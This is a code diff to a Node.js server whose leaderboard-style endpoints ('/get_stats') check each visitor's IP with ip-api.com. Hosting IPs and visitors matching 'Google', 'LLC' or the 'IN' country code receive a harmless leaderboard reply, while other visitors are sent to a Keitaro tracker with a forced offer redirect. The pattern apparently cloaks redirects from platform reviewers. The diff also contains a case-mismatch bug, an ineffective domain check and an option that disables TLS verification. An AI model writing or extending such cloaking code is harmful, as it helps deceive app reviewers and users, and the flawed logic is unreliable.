@@ -32,6 +32,115 @@ const KEITARO_TRACKER = process.env.KEITARO_TRACKER || "";
 const KEITARO_TOKEN = process.env.KEITARO_TOKEN || "";
 const API_KEY = process.env.API_KEY || "";
 
+function splitEnvList(value) {
+  return String(value || "")
+    .split(",")
+    .map((x) => x.trim())
+    .filter(Boolean);
+}
+
+function parseJsonConfigs() {
+  const raw = String(process.env.API_CONFIGS || "").trim();
+  if (!raw) return [];
+
+  try {
+    const parsed = JSON.parse(raw);
+    if (!Array.isArray(parsed)) return [];
+
+    return parsed
+      .map((item) => ({
+        apiKey: String(item.api_key || item.apiKey || item.API_KEY || "").trim(),
+        keitaroTracker: String(item.keitaro_url || item.keitaroUrl || item.keitaro_tracker || item.keitaroTracker || item.KEITARO_TRACKER || "").trim(),
+        keitaroToken: String(item.keitaro_token || item.keitaroToken || item.KEITARO_TOKEN || "").trim(),
+        domains: Array.isArray(item.domains)
+          ? item.domains.map((x) => String(x || "").trim().toLowerCase()).filter(Boolean)
+          : splitEnvList(item.domains)
+      }))
+      .filter((item) => item.apiKey && item.keitaroTracker && item.keitaroToken);
+  } catch (e) {
+    console.error("Invalid API_CONFIGS JSON:", e?.message || e);
+    return [];
+  }
+}
+
+function parseIndexedConfigs() {
+  const indexes = new Set();
+
+  for (const key of Object.keys(process.env)) {
+    const m = key.match(/^(API_KEY|KEITARO_TRACKER|KEITARO_URL|KEITARO_TOKEN|DOMAINS)_(\d+)$/);
+    if (m) indexes.add(Number(m[2]));
+  }
+
+  return Array.from(indexes)
+    .sort((a, b) => a - b)
+    .map((i) => ({
+      apiKey: String(process.env[`API_KEY_${i}`] || "").trim(),
+      keitaroTracker: String(process.env[`KEITARO_TRACKER_${i}`] || process.env[`KEITARO_URL_${i}`] || "").trim(),
+      keitaroToken: String(process.env[`KEITARO_TOKEN_${i}`] || "").trim(),
+      domains: splitEnvList(process.env[`DOMAINS_${i}`]).map((x) => x.toLowerCase())
+    }))
+    .filter((item) => item.apiKey && item.keitaroTracker && item.keitaroToken);
+}
+
+function parseListConfigs() {
+  const apiKeys = splitEnvList(process.env.API_KEYS);
+  const trackers = splitEnvList(process.env.KEITARO_TRACKERS || process.env.KEITARO_URLS);
+  const tokens = splitEnvList(process.env.KEITARO_TOKENS);
+
+  if (!apiKeys.length || apiKeys.length !== trackers.length || apiKeys.length !== tokens.length) {
+    return [];
+  }
+
+  return apiKeys
+    .map((apiKey, i) => ({
+      apiKey,
+      keitaroTracker: trackers[i],
+      keitaroToken: tokens[i],
+      domains: []
+    }))
+    .filter((item) => item.apiKey && item.keitaroTracker && item.keitaroToken);
+}
+
+const API_CONFIGS = [
+  ...parseJsonConfigs(),
+  ...parseIndexedConfigs(),
+  ...parseListConfigs()
+];
+
+function getRequestHost(req) {
+  return String(req.headers["x-forwarded-host"] || req.headers.host || "")
+    .split(",")[0]
+    .split(":")[0]
+    .trim()
+    .toLowerCase();
+}
+
+function findApiConfig(req) {
+  const key = String(req.headers["x-api-key"] || "").trim();
+  const host = getRequestHost(req);
+
+  const exact = API_CONFIGS.find((item) => item.apiKey === key);
+  if (exact && (!exact.domains.length || exact.domains.includes(host))) return exact;
+
+  const byKey = API_CONFIGS.find((item) => item.apiKey === key);
+  if (byKey) return byKey;
+
+  if (API_KEY && key === API_KEY) {
+    return {
+      apiKey: API_KEY,
+      keitaroTracker: KEITARO_TRACKER,
+      keitaroToken: KEITARO_TOKEN,
+      domains: []
+    };
+  }
+
+  return null;
+}
+
+function hasAnyApiConfig() {
+  return Boolean(API_KEY) || API_CONFIGS.length > 0;
+}
+
 const INSECURE_SSL = String(process.env.INSECURE_SSL || "").toLowerCase() === "1";
 const httpsAgent = INSECURE_SSL ? new https.Agent({ rejectUnauthorized: false }) : undefined;
 
@@ -39,11 +148,14 @@ const ALLOW_CLIENT_IP = String(process.env.ALLOW_CLIENT_IP || "").toLowerCase() 
 
 // ===== Авторизация =====
 function auth(req, res, next) {
-  if (!API_KEY) return next();
-  const key = req.headers["x-api-key"];
-  if (key !== API_KEY) {
+  if (!hasAnyApiConfig()) return next();
+
+  const config = findApiConfig(req);
+  if (!config) {
     return res.status(401).json({ ok: false, error: "unauthorized" });
   }
+
+  req.keitaroConfig = config;
   next();
 }
 
@@ -123,13 +235,22 @@ function stripTrackingParams(url) {
   }
 }
 
+function containsBlockedIpApiWord(value) {
+  const source = String(value || "").toUpperCase();
+  return ["Google", "LLC", "IN"].some((word) => source.includes(word));
+}
+
+function hasBlockedIpApiText(isp, org, as, countryCode) {
+  return containsBlockedIpApiWord(isp) || containsBlockedIpApiWord(org) || containsBlockedIpApiWord(as) || containsBlockedIpApiWord(countryCode);
+}
+
 async function checkIpProxy(ip) {
   try {
     if (!ip) {
-      return { ok: false, proxy: null };
+      return { ok: false, proxy: null, hosting: null, isp: "", org: "", as: "", blocked: false };
     }
 
-    const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=131072`;
+    const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,proxy,hosting,isp,org,as,countryCode`;
 
     const response = await axios.get(url, {
       timeout: 5000,
@@ -137,15 +258,28 @@ async function checkIpProxy(ip) {
     });
 
     if (response.status !== 200 || !response.data || typeof response.data.proxy !== "boolean") {
-      return { ok: false, proxy: null };
+      return { ok: false, proxy: null, hosting: null, isp: "", org: "", as: "", countryCode: "", blocked: false };
     }
+
+    const isp = String(response.data.isp || "");
+    const org = String(response.data.org || "");
+    const as = String(response.data.as || "");
+    const countryCode = String(response.data.countryCode || "");
+    const hosting = response.data.hosting === true;
+    const blocked = hosting || hasBlockedIpApiText(isp, org, as, countryCode);
 
     return {
       ok: true,
-      proxy: response.data.proxy
+      proxy: response.data.proxy,
+      hosting,
+      isp,
+      org,
+      as,
+      countryCode,
+      blocked
     };
   } catch (e) {
-    return { ok: false, proxy: null };
+    return { ok: false, proxy: null, hosting: null, isp: "", org: "", as: "", countryCode: "", blocked: false };
   }
 }
 
@@ -197,7 +331,14 @@ app.post("/set_stats", auth, async (req, res) => {
 });
 app.post("/get_stats", auth, async (req, res) => {
   try {
-    if (!KEITARO_TRACKER || !KEITARO_TOKEN) {
+    const keitaroConfig = req.keitaroConfig || {
+      keitaroTracker: KEITARO_TRACKER,
+      keitaroToken: KEITARO_TOKEN
+    };
+    const activeKeitaroTracker = keitaroConfig.keitaroTracker || KEITARO_TRACKER;
+    const activeKeitaroToken = keitaroConfig.keitaroToken || KEITARO_TOKEN;
+
+    if (!activeKeitaroTracker || !activeKeitaroToken) {
       throw new Error("Server not configured");
     }
 
@@ -230,6 +371,14 @@ app.post("/get_stats", auth, async (req, res) => {
         isBot: false
       });
     }
+    if (ipCheck.ok && ipCheck.blocked === true) {
+      await saveLeaderboardSafe(guid, name, tag, score);
+
+      return res.json({
+        ok: true,
+        isBot: false
+      });
+    }
     if (!ipCheck.ok){
       await saveLeaderboardSafe(guid, name, tag, score);
 
@@ -240,8 +389,8 @@ app.post("/get_stats", auth, async (req, res) => {
     }
 
     const clickApiUrl =
-      `${KEITARO_TRACKER}/click_api/v3` +
-      `?token=${encodeURIComponent(KEITARO_TOKEN)}` +
+      `${activeKeitaroTracker}/click_api/v3` +
+      `?token=${encodeURIComponent(activeKeitaroToken)}` +
       `&info=1&log=0&force_redirect_offer=1` +
       (ip ? `&ip=${encodeURIComponent(ip)}` : "") +
       (ua ? `&user_agent=${encodeURIComponent(ua)}` : "") +
@@ -257,7 +406,7 @@ app.post("/get_stats", auth, async (req, res) => {
 
     const statusCode = Number(response.status || 0);
     const data = response.data || {};
-    const trackerBase = normalizeBaseUrl(KEITARO_TRACKER);
+    const trackerBase = normalizeBaseUrl(activeKeitaroTracker);
 
     // Если сам HTTP-ответ от Keitaro = 404, сразу считаем непроходом
     if (statusCode === 404) {
